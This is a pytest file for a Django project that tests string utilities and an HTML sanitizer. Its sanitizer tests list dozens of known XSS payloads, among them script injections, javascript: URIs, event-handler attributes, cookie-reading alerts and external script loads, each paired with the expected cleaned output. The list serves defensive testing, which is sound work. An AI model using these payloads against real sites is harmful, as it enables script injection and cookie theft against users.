from typing import Dict, List, Type, Union

import pytest
from django.contrib.postgres.fields.jsonb import JsonAdapter
from django.utils.html import format_html

from mcod.lib.model_sanitization import (
    SanitizedCharField,
    SanitizedJSONField,
    SanitizedRichTextUploadingField,
    SanitizedTextField,
    SanitizedTranslationField,
    sanitize_html,
)
from mcod.lib.utils import (
    capitalize_first_character,
    escape_braces_and_format_html,
    get_file_extensions_no_dot,
)


class TestFormatHTML:
    """
    Tests for HTML formatting functions, specifically examining behavior when
    processing curly braces.

    This test class includes methods to test two different behaviors:
    1. The newly implemented function `escape_braces_and_format_html`,
    which is supposed to correctly escape curly braces to prevent them from
    being treated as placeholders in a formatting string.
    2. The standard Django `format_html` function, which throws exceptions
    or modifies the input text when it contains curly braces that might be
    mistaken for format specifiers.
    """

    @pytest.mark.parametrize(
        "text", ["{text", "{{ text", "test {text}", "}{", "{}", "test }} text", "text}", "<div>{text in braces}</div>"]
    )
    def test_escape_braces_and_format_html(self, text: str):
        formatted_text: str = escape_braces_and_format_html(text)
        assert formatted_text == text

    @pytest.mark.parametrize("text", ["{{ text", "test }} text"])
    def test_format_html_change_text_with_escaped_braces(self, text: str):
        assert format_html(text) != text

    @pytest.mark.parametrize("text", ["{text", "test {text}", "}{", "{}", "text}"])
    def test_format_html_raise_exc_for_unescaped_braces(self, text: str):
        with pytest.raises((KeyError, ValueError, IndexError)):
            format_html(text)


@pytest.mark.parametrize(
    ("input_text", "expected_text"),
    [
        ("some string", "Some string"),
        ("some string. another string", "Some string. another string"),
        ("some String", "Some String"),
        ("Some String", "Some String"),
        ("underscore_string", "Underscore_string"),
        ("1 Some String", "1 Some String"),
        (" Some String", " Some String"),
        ("", ""),
        (" ", " "),
    ],
)
def test_capitalize_first_character(input_text: str, expected_text: str):
    assert expected_text == capitalize_first_character(input_text)


class TestXssSanitizer:
    @pytest.mark.parametrize(
        "dangerous_html_tags, expected_output",
        [
            (
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert"
                '(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'>'
                "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";"
                'alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--&gt;"&gt;'
                "'&gt;alert(String.fromCharCode(88,83,83))",
            ),
            ("'';!--\"<XSS>=&{()}", "'';!--\"=&amp;{()}"),
            (
                '0\\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"',
                '0\\"autofocus/onfocus=alert(1)--&gt;"-confirm(3)-"',
            ),
            ("<script/src=data:,alert()>", ""),
            ("<marquee/onstart=alert()>", ""),
            ("<video/poster/onerror=alert()>", ""),
            ("<isindex/autofocus/onfocus=alert()>", ""),
            ("<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>", ""),
            ("<IMG SRC=\"javascript:alert('XSS');\">", "<img>"),
            ("<IMG SRC=javascript:alert('XSS')>", "<img>"),
            ("<IMG SRC=JaVaScRiPt:alert('XSS')>", "<img>"),
            ('<IMG SRC=javascript:alert("XSS")>', "<img>"),
            ("<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>", "<img>"),
            ('<a onmouseover="alert(document.cookie)">xxs link</a>', "<a>xxs link</a>"),
            ("<a onmouseover=alert(document.cookie)>xxs link</a>", "<a>xxs link</a>"),
            ('<IMG """><SCRIPT>alert("XSS")</SCRIPT>">', '<img>alert("XSS")"&gt;'),
            ("<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "<img>"),
            ("<IMG SRC=# onmouseover=\"alert('xxs')\">", '<img src="#">'),
            ("<IMG SRC= onmouseover=\"alert('xxs')\">", "<img src=\"onmouseover=&quot;alert('xxs')&quot;\">"),
            ("<IMG onmouseover=\"alert('xxs')\">", "<img>"),
            ('<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>', '<img src="/">'),
            (
                "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;",
                "&lt;IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;",
            ),
            ("&#39;&#88;&#83;&#83;&#39;&#41;>", "&#39;&#88;&#83;&#83;&#39;&#41;&gt;"),
            (
                "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#"
                "0000112&#0000116&#0000058&#0000097&",
                "&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;"
                "#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;",
            ),
            (
                "#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
                "#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;"
                "#0000083&amp;#0000039&amp;#0000041&gt;",
            ),
            (
                "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#"
                "x53&#x53&#x27&#x29>",
                '<img src="&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&'
                'amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29">',
            ),
            ("<IMG SRC=\"jav\tascript:alert('XSS');\">", "<img>"),
            ("<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">", "<img>"),
            ("<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">", "<img>"),
            ("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", "<img>"),
            ("<IMG SRC=\" &#14;  javascript:alert('XSS');\">", "<img>"),
            ('<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>', ""),
            ('<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>', ""),
            ('<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>', ""),
            ('<<SCRIPT>alert("XSS");//<</SCRIPT>', '&lt;alert("XSS");//&lt;'),
            ("<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >", ""),
            ("<SCRIPT SRC=//ha.ckers.org/.j>", ""),
            ("<IMG SRC=\"javascript:alert('XSS')\"", ""),
            ("<iframe src=http://ha.ckers.org/scriptlet.html <", "&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;"),
            ("\\\";alert('XSS');//", "\\\";alert('XSS');//"),
            ("</script><script>alert('XSS');</script>", "alert('XSS');"),
            ('</TITLE><SCRIPT>alert("XSS");</SCRIPT>', 'alert("XSS");'),
            ('<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">', ""),
            ("<BODY BACKGROUND=\"javascript:alert('XSS')\">", ""),
            ("<IMG DYNSRC=\"javascript:alert('XSS')\">", "<img>"),
            ("<IMG LOWSRC=\"javascript:alert('XSS')\">", "<img>"),
            (
                "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
                "li {list-style-image: url(\"javascript:alert('XSS')\");}<ul><li>XSS<br></li></ul>",
            ),
            ("<IMG SRC='vbscript:msgbox(\"XSS\")'>", "<img>"),
            ('<IMG SRC="livescript:[code]">', "<img>"),
            ("<BODY ONLOAD=alert('XSS')>", ""),
            ("<BGSOUND SRC=\"javascript:alert('XSS');\">", ""),
            ("<BR SIZE=\"&{alert('XSS')}\">", "<br>"),
            ('<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">', ""),
            ('<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">', ""),
            ("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", "@import'http://ha.ckers.org/xss.css';"),
            ('<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">', ""),
            (
                '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
                'BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}',
            ),
            ("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", "@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';"),
            ("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", '<img style="">'),
            ('exp/*<A STYLE=\'no\\xss:noxss("*//*");', "exp/*"),
            ('xss:ex/*XSS*//*/*/pression(alert("XSS"))\'>', 'xss:ex/*XSS*//*/*/pression(alert("XSS"))\'&gt;'),
            ("<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>", "alert('XSS');"),
            (
                "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
                ".XSS{background-image:url(\"javascript:alert('XSS')\");}<a></a>",
            ),
            (
                '<STYLE type="text/css">BODY{background:url("javascript:alert(\'XSS\')")}</STYLE>',
                "BODY{background:url(\"javascript:alert('XSS')\")}",
            ),
            ("<XSS STYLE=\"xss:expression(alert('XSS'))\">", ""),
            ('<XSS STYLE="behavior: url(xss.htc);">', ""),
            ("¼script¾alert(¢XSS¢)¼/script¾", "¼script¾alert(¢XSS¢)¼/script¾"),
            ('<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">', ""),
            ('<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">', ""),
            ('<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">', ""),
            ("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", ""),
            ('<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>', ""),
            ("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", ""),
            ("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", "<table></table>"),
            ("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", "<table><tbody><tr><td></td></tr></tbody></table>"),
            ("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", '<div style=""></div>'),
            (
                "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070"
                "\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
                '<div style=""></div>',
            ),
            ("<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">", '<div style=""></div>'),
            ("<DIV STYLE=\"width: expression(alert('XSS'));\">", "<div style='width: expression(alert(\"XSS\"));'></div>"),
            (
                "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
                "<!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert(&#x27;XSS&#x27;);&lt;/SCRIPT&gt;&lt;![endif]-->",
            ),
            ("<BASE HREF=\"javascript:alert('XSS');//\">", ""),
            ('<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>', ""),
            (
                "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"
                "'\"-->",
                "<!--#exec cmd=&quot;/bin/echo &#x27;&lt;SCR&#x27;&quot;--><!--#exec cmd=&quot;/bin/echo &#x27;IPT SRC=http://"
                "ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&#x27;&quot;-->",
            ),
            (
                "<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>",
                '<!--? echo(&#x27;&lt;SCR)&#x27;;echo(&#x27;IPT-->alert("XSS")\'); ?&gt;',
            ),
            (
                '<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
                '<img src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">',
            ),
            ('<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(\'XSS\')</SCRIPT>">', ""),
            (
                '<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(\'XSS\');'
                "+ADw-/SCRIPT+AD4-",
                " +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",
            ),
            ('<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', ""),
            ('<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '" SRC="http://ha.ckers.org/xss.js"&gt;'),
            ('<SCRIPT a=">" \'\' SRC="http://ha.ckers.org/xss.js"></SCRIPT>', ""),
            ('<SCRIPT "a=\'>\'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', ""),
            ('<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>', '` SRC="http://ha.ckers.org/xss.js"&gt;'),
            ('<SCRIPT a=">\'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>', ""),
            (
                '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
                'document.write("PT SRC="http://ha.ckers.org/xss.js"&gt;',
            ),
            ('<A HREF="http://66.102.7.147/">XSS</A>', '<a href="http://66.102.7.147/">XSS</a>'),
            (
                '0\\"autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>"-confirm(3)-"',
                '0\\"autofocus/onfocus=alert(1)--&gt;"-confirm(3)-"',
            ),
            ("veris-->group<svg/onload=alert(/XSS/)//", "veris--&gt;group&lt;svg/onload=alert(/XSS/)//"),
            ("#\"><img src=M onerror=alert('XSS');>", '#"&gt;<img src="M">'),
            ("element[attribute='<img src=x onerror=alert('XSS');>", 'element[attribute=\'<img src="x">'),
            (
                '[<blockquote cite="]">[" onmouseover="alert(\'RVRSH3LL_XSS\');" ]',
                '[<blockquote>[" onmouseover="alert(\'RVRSH3LL_XSS\');" ]</blockquote>',
            ),
            ("%22;alert%28%27RVRSH3LL_XSS%29//", "%22;alert%28%27RVRSH3LL_XSS%29//"),
            ("javascript:alert%281%29;", "javascript:alert%281%29;"),
            ("<w contenteditable id=x onfocus=alert()>", ""),
            ('alert;pg("XSS")', 'alert;pg("XSS")'),
            ("<svg/onload=%26%23097lert%26lpar;1337)>", ""),
            ("<script>for((i)in(self))eval(i)(1)</script>", "for((i)in(self))eval(i)(1)"),
            (
                "<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>",
                "ipt&gt;alert(1)ipt&gt;ipt&gt;alert(1)ipt&gt;",
            ),
            ("<sCR<script>iPt>alert(1)</SCr</script>IPt>", "iPt&gt;alert(1)IPt&gt;"),
            ('<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>', "<a>test</a>"),
        ],
    )
    def test_input_dangerous_html_tags(self, dangerous_html_tags: str, expected_output: str):
        assert sanitize_html(dangerous_html_tags) == expected_output


test_data_all_fields = [
    ("<script>alert('XSS');</script><p>Hello World</p>", "alert('XSS');<p>Hello World</p>"),
    ("<b>Bold Text</b>", "<b>Bold Text</b>"),
    ("No HTML", "No HTML"),
    ("<script>console.log('test');</script>", "console.log('test');"),
    (None, None),
]

test_classes = [SanitizedCharField, SanitizedRichTextUploadingField, SanitizedTextField]


@pytest.mark.parametrize("cls", test_classes)
@pytest.mark.parametrize("input_value, expected_output", test_data_all_fields)
def test_sanitize_for_all_fields(cls: Type, input_value: str, expected_output: str) -> None:
    """Tests HTML sanitization features against malicious XSS, specifically examining behavior when
    input is String"""
    instance = cls()
    sanitized_value = instance.get_prep_value(input_value)
    assert sanitized_value == expected_output


test_data_json_field = [
    ({"<script>key</script>": "<script>alert('XSS');</script>value"}, {"key": "alert('XSS');value"}),
    ([{"title": "<script>Title</script>", "url": "<script>URL</script>"}], [{"title": "Title", "url": "URL"}]),
    (["<b>Bold</b>", {"title": "<script>Another Title</script>"}], ["<b>Bold</b>", {"title": "Another Title"}]),
    ([], []),
    (None, None),
]


@pytest.mark.parametrize("input_value, expected_output", test_data_json_field)
def test_sanitize_json_field(
    input_value: Union[Dict[str, str], List[Dict[str, str]]], expected_output: Union[Dict[str, str], List[Dict[str, str]]]
) -> None:
    """Tests HTML sanitization features against malicious XSS, specifically examining behavior when
    input is JSONField."""
    instance = SanitizedJSONField()
    sanitized_value = instance.get_prep_value(input_value)
    if isinstance(sanitized_value, JsonAdapter):
        sanitized_value = sanitized_value.adapted
    assert sanitized_value == expected_output


test_data_translation_field = [
    ({"<script>title_en</script>": "<script>alert('XSS');</script>value"}, {"<script>title_en</script>": "alert('XSS');value"}),
    ({"title_en": None, "title_pl": "<script>alert('Hello');</script>"}, {"title_en": None, "title_pl": "alert('Hello');"}),
    ({}, {}),
    (None, None),
]


@pytest.mark.parametrize("input_value, expected_output", test_data_translation_field)
def test_sanitize_translation_field(input_value: Dict[str, str], expected_output: Dict[str, str]) -> None:
    """Tests HTML sanitization features against malicious XSS, specifically examining behavior when
    the input is TranslationField"""
    instance = SanitizedTranslationField()
    sanitized_value = instance.get_prep_value(input_value)
    if isinstance(sanitized_value, JsonAdapter):
        sanitized_value = sanitized_value.adapted
    assert sanitized_value == expected_output


@pytest.mark.parametrize(
    "filenames, expected_extensions",
    (
        (["1.csv", "1.", "1"], ["csv"]),
        (["1.csv", "1.xml", "1.xml.gpg"], ["csv", "xml", "gpg"]),
    ),
)
def test_get_file_extensions_no_dot(filenames: List[str], expected_extensions: List[str]) -> None:
    assert get_file_extensions_no_dot(filenames) == expected_extensions
